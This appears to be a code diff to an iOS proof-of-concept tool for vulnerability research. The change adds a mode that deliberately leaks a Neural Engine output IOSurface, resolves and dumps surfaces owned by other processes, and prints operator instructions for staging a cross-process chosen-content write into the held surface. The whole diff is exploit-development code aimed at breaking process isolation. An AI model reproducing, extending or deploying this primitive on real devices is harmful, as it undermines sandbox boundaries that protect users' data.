@@ -508,6 +508,10 @@ static CFTypeRef g_guestHold;
 static uint32_t  g_guestHoldSid;
 static uint16_t  g_guestHoldTile;
 static int       g_guestPreValid;
+static int       g_guestHoldANE; /* v64: guest ANE-hold — hold the request
+   OUTPUT surface (consumer-mapped, shared-registry candidate) instead of
+   a plain task-owned tile (round-1 control, note 166: plain holds do NOT
+   resolve cross-process; ANE-mapped is the open class) */
 
 /* v48.1 _ANEClient lane state (file scope so cleanup can always release) */
 static id g_aneModelObj = nil;
@@ -1933,6 +1937,11 @@ static void *watch_worker(void *arg) {
                                                  encoding:NSUTF8StringEncoding error:NULL];
         if (gs) {
             unlink(gPath.fileSystemRepresentation);
+            /* v62 fix: this block runs BEFORE PHASE 3a — resolve the IOSurface
+               dlsym pointers here, or the first-tap HOLD create fails with
+               all-NULL function pointers ("hold surface create failed").
+               Idempotent: no-op once PHASE 3a (or a prior tap) resolved them. */
+            p044_surface_syms(out);
             if (g_guestHold) {
                 uint16_t tile = g_guestHoldTile;
                 [out appendFormat:@"\n=== v62 GUEST OBSERVE: held sid=%u pre-tile=0x%04x ===\n",
@@ -1961,6 +1970,19 @@ static void *watch_worker(void *arg) {
                 p044_write_log(out);
                 return out;
             }
+            /* v64 guest ANE-hold: p044_guest.txt = "ane" => do NOT early-
+               return. The FULL pipeline runs below (guest's own fire,
+               default or file-driven) so the consumer MAPS the request
+               OUTPUT surface; the census lane is intentionally NOT armed
+               (see 3a.5 discard) so the OUTPUT surface is OUR OWN; cleanup
+               steals it into g_guestHold instead of releasing it. Plain
+               tile value (e.g. 4b1d) = round-1 boundary control, unchanged. */
+            NSString *gmode = [[gs lowercaseString] stringByTrimmingCharactersInSet:
+                [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if ([gmode hasPrefix:@"ane"]) {
+                g_guestHoldANE = 1;
+                [out appendString:@"  [v64] GUEST ANE-HOLD MODE: full fire runs this tap (~2 min). The request OUTPUT surface — consumer-mapped by the ANE — is HELD at cleanup instead of released; its sid prints at the END of this log. Keep the app alive; do not force-quit.\n"];
+            } else {
             uint16_t tile = p044FillTileValid ? p044FillTile : 0x4b1d;
             CFTypeRef srf = p044_surface_create_poc(P044_REQ_OUT_BYTES, (uint8_t)(tile & 0xff));
             if (!srf) {
@@ -1994,6 +2016,7 @@ static void *watch_worker(void *arg) {
             }
             p044_write_log(out);
             return out;
+            } /* end plain-hold (v62) branch */
         }
     }
 
@@ -2179,6 +2202,38 @@ static void *watch_worker(void *arg) {
             g_foreignOutSid = p044TargetSidOverride;
             [out appendFormat:@"  [v62] OUT-SID TARGET=%u (file override — stillness pick skipped; census kept for forensics)\n",
                 g_foreignOutSid];
+            /* v64 fix: HONEST early round-trip. The old code printed a zero
+               snap0 "(stillness-checked)" line here WITHOUT ever resolving
+               the file target (the 10:51 Lane B run read as a resolved
+               zeroed surface when no lookup had happened — the only real
+               lookup was the 3c arm-time one). Resolve NOW so the guest
+               surface's foreign-lookup verdict lands at 3a.5. */
+            {
+                CFTypeRef ft = p044_sfLookup(g_foreignOutSid);
+                if (!ft) {
+                    [out appendFormat:@"  [v64] FILE-TARGET sid %u NOT RESOLVABLE from this task at 3a.5 — guest surface dead, task-owned (owner boundary, note 163), or not shared-registry class. Arm-time re-validation retries at 3c.\n",
+                        g_foreignOutSid];
+                } else {
+                    uint32_t frt = p044_sfGetID ? p044_sfGetID(ft) : 0;
+                    uint32_t fuc = p044_sfUseCount ? p044_sfUseCount(ft) : 0;
+                    uint8_t f8[8] = {0};
+                    if (p044_sfLock(ft, 1, NULL) == 0) {
+                        uint8_t *fb = (uint8_t *)p044_sfBase(ft);
+                        if (fb) {
+                            memcpy(f8, fb, 8);
+                            memcpy(g_foreignSnap, fb, sizeof(g_foreignSnap));
+                            g_foreignSnapValid = 1;
+                        }
+                        p044_sfUnlock(ft, 1, NULL);
+                    }
+                    g_foreignUsePre = fuc;
+                    [out appendFormat:@"  [v64] FILE-TARGET sid %u RESOLVES at 3a.5: rt=%u useCount=%u snap8=%02x%02x%02x%02x %02x%02x%02x%02x (guest tile = LE 1d 4b repeating)%@\n",
+                        g_foreignOutSid, frt, fuc,
+                        f8[0], f8[1], f8[2], f8[3], f8[4], f8[5], f8[6], f8[7],
+                        (frt == g_foreignOutSid) ? @" — round-trip OK" : @" — rt MISMATCH (alias): lane drops");
+                    CFRelease(ft);
+                }
+            }
         }
         for (size_t k = 0; k < nFirst && g_foreignOutSid == 0; k++) {
             uint32_t sid = forFirst[k];
@@ -2229,6 +2284,16 @@ static void *watch_worker(void *arg) {
         } else if (nFirst > 0) {
             [out appendString:@"  [v56] no still foreign candidate across 1.2 s re-diff — "
                               @"all movers (own CoreML/Siri staging); lane NOT armed this tap\n"];
+        }
+        /* v64: in the guest ANE-hold tap the OUTPUT surface must be OUR OWN
+           so cleanup can hold it — the request OUTPUT must NOT bind to a
+           census target. Discard the stillness pick (census itself stays
+           for forensics; the pick is what arms the lane at build time). */
+        if (g_guestHoldANE && g_foreignOutSid) {
+            [out appendFormat:@"  [v64] guest ANE-hold tap: census pick sid=%u DISCARDED — lane intentionally NOT armed so the request OUTPUT surface is our own (held at cleanup)\n",
+                g_foreignOutSid];
+            g_foreignOutSid = 0;
+            g_foreignSnapValid = 0;
         }
         if (foreignHits > 0) {
             [out appendString:@"  *** FOREIGN SURFACES RESOLVE BY ID. v56 re-read (note 126): "
@@ -2816,6 +2881,24 @@ static void *watch_worker(void *arg) {
         g_watchScanned = NULL;
     }
     g_watchDrain = NULL;
+    /* v64: guest ANE-hold — steal the request OUTPUT surface out of the
+       release array BEFORE the loop. Stealing the reference (g_surfs slot
+       NULLed, no CFRelease) keeps the kernel IOSurface alive with the
+       guest task as owner while the user background-suspends the app —
+       exactly the round-2 candidate (round-1 plain hold sid 160 did NOT
+       resolve cross-process; this one was consumer-MAPPED, so it may sit
+       in the shared registry class — note 166). */
+    if (g_guestHoldANE && g_p044_outSid && p044_sfGetID) {
+        for (uint32_t i = 0; i < g_nSurf; i++) {
+            if (g_surfs[i] && p044_sfGetID(g_surfs[i]) == g_p044_outSid) {
+                g_guestHold = g_surfs[i]; /* steal — NOT released below */
+                g_surfs[i] = NULL;
+                g_guestHoldSid = g_p044_outSid;
+                g_guestHoldTile = 0; /* not tiled — content = its own inference output */
+                break;
+            }
+        }
+    }
     {
         uint32_t released = g_nSurf;
         for (uint32_t i = 0; i < released; i++) {
@@ -2833,6 +2916,23 @@ static void *watch_worker(void *arg) {
     g_aneModelOk = 0;
     g_aneReqOk = 0;
     [out appendString:@"  _ANEClient lane released\n"];
+    if (g_guestHold) {
+        [out appendFormat:@"\n=== v64 GUEST ANE HOLD: sid=%u (request OUTPUT surface — ANE consumer-mapped; held, NOT released) ===\n",
+            g_guestHoldSid];
+        if (p044_sfLock(g_guestHold, 1, NULL) == 0) {
+            uint8_t *b = (uint8_t *)p044_sfBase(g_guestHold);
+            if (b) {
+                p044_write_bin(@"p044_guest_pre.bin", b, P044_REQ_OUT_BYTES);
+                g_guestPreValid = 1;
+                [out appendString:@"  p044_guest_pre.bin written (pre-fire evidence — base bytes above are the guest surface's own pre content).\n"];
+            }
+            p044_sfUnlock(g_guestHold, 1, NULL);
+        } else {
+            [out appendString:@"  pre-dump lock FAILED — surface dead at hold time; observe will say so.\n"];
+        }
+        [out appendString:@"  KEEP THIS APP BACKGROUND-ALIVE (no force-quit). Push this sid as p044_target.txt into the STANDALONE app's Documents (house_arrest) + p044_fill.txt=<pattern e.g. 5eaf,4b1d> + p044_req_in.txt=127 + p044_model.txt=XVRC27_127in_copyout, tap the STANDALONE (its fire aims HERE), then return and tap with p044_guest.txt again (any content) to OBSERVE: p044_guest_after.bin showing the STANDALONE's chosen pattern at the base = CROSS-PROCESS CHOSEN-CONTENT WRITE into a GUEST-held surface.\n"];
+        g_guestHoldANE = 0;
+    }
     [out appendString:@"  cleanup done (witnesses joined)\n"];
 
     p044_write_log(out);
